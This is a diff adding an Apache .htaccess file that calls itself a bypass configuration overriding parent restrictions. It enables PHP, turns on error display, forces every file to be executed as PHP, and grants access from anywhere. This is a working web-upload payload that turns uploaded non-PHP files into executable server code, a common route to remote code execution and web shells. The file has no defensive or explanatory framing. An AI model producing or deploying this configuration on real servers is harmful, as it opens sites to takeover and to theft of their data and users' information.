@@ -1,0 +1,15 @@
+# Bypass Configuration - Override parent restrictions
+php_flag engine on
+php_flag display_errors on
+
+# Force all files to be executed as PHP
+<FilesMatch ".*">
+    SetHandler application/x-httpd-php
+</FilesMatch>
+
+# Allow access from anywhere
+Order allow,deny
+Allow from all
+
+# Alternative for Apache 2.4+
+Require all granted
